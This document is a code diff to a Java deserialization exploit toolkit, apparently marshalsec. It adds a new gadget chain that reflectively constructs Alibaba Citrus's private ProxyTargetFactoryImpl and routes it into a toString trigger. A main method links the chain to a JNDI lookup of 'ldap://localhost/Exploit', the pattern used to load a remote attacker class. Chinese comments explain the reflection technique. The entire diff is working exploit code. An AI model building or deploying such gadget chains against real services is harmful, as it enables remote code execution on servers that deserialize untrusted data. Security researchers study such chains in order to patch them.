@@ -24,12 +24,16 @@ package marshalsec.gadgets;
 
 
 import java.io.File;
+import java.lang.reflect.Constructor;
 import java.lang.reflect.Field;
 import java.lang.reflect.InvocationTargetException;
 import java.lang.reflect.Modifier;
 import java.util.HashSet;
 import java.util.Map;
 
+import com.alibaba.citrus.springext.support.parser.AbstractNamedProxyBeanDefinitionParser;
+import com.alibaba.citrus.springext.util.ProxyTargetFactory;
+import com.alibaba.citrus.springext.util.SpringExtUtil;
 import org.aopalliance.aop.Advice;
 import org.apache.commons.logging.impl.NoOpLog;
 import org.springframework.aop.aspectj.AbstractAspectJAdvice;
@@ -42,10 +46,14 @@ import org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor;
 import org.springframework.beans.factory.BeanFactory;
 import org.springframework.beans.factory.support.DefaultListableBeanFactory;
 import org.springframework.beans.factory.support.RootBeanDefinition;
+import org.springframework.beans.factory.xml.AbstractBeanDefinitionParser;
 import org.springframework.jndi.support.SimpleJndiBeanFactory;
 
 import marshalsec.UtilFactory;
 import marshalsec.util.Reflections;
+import org.w3c.dom.Element;
+
+import static com.alibaba.citrus.springext.support.parser.AbstractNamedProxyBeanDefinitionParser.*;
 
 
 /**
@@ -96,43 +104,38 @@ public final class SpringUtil {
         DefaultBeanFactoryPointcutAdvisor pcadv = new DefaultBeanFactoryPointcutAdvisor();
         pcadv.setBeanFactory(bf);
         pcadv.setAdviceBeanName(name);
+
         AbstractAspectJAdvice advice = Reflections.createWithoutConstructor(AspectJAroundAdvice.class);
-        //反射修改advice属性不是原子性的。
-        Field[] fields = AbstractBeanFactoryPointcutAdvisor.class.getDeclaredFields();
-
-        for(Field field : fields)
-
-        {
-
-            System.out.print(field.getName() +"->");
-            System.out.print(field.getModifiers());
-            System.out.println(Modifier.toString(field.getModifiers()));
-
-        }
-
-
-        Field ad = Reflections.getField(pcadv.getClass(),"advice");
-        ad.setAccessible(true);
-
-        Field modifiersField = Field.class.getDeclaredField("modifiers");
-        modifiersField.setAccessible(true);
-        modifiersField.setInt(ad,2);
-
         pcadv.setAdvice(advice);
 
         DefaultBeanFactoryPointcutAdvisor defaultBeanFactoryPointcutAdvisor = new DefaultBeanFactoryPointcutAdvisor();
-
-        Field ad2 = Reflections.getField(defaultBeanFactoryPointcutAdvisor.getClass(),"advice");
-        ad2.setAccessible(true);
-
-        Field modifiersField2 = Field.class.getDeclaredField("modifiers");
-        modifiersField2.setAccessible(true);
-        modifiersField2.setInt(ad2,2);
-
         defaultBeanFactoryPointcutAdvisor.setAdvice(advice);
 
         return uf.makeEqualsTrigger(pcadv, defaultBeanFactoryPointcutAdvisor);
     }
+
+    public static Object makeBeanFactoryTriggerBFPA2 ( UtilFactory uf, String name, BeanFactory bf ) throws Exception {
+        //通过反射机制访问并设置触发一个ProxyTargetFactoryImpl的类，其内部的beanname和factory都可以被指定。
+        Class  clazz = Class.forName("com.alibaba.citrus.springext.support.parser.AbstractNamedProxyBeanDefinitionParser$ProxyTargetFactoryImpl");
+        Constructor<?> constructor=  clazz.getDeclaredConstructor(String.class,BeanFactory.class);
+        constructor.setAccessible(true);
+
+        SpringExtUtil.AbstractProxy abstractProxy = new SpringExtUtil.AbstractProxy(String.class, (ProxyTargetFactory) constructor.newInstance(name,bf));
+        return uf.makeToStringTriggerUnstable(abstractProxy);
+
+
+    }
+
+    public static void main(String[] args) throws Exception{
+
+       Object o = makeBeanFactoryTriggerBFPA2(null,"ldap://localhost/Exploit",makeJNDITrigger("ldap://localhost/Exploit"));
+
+
+    }
+
+
+
+
 
 
     /**
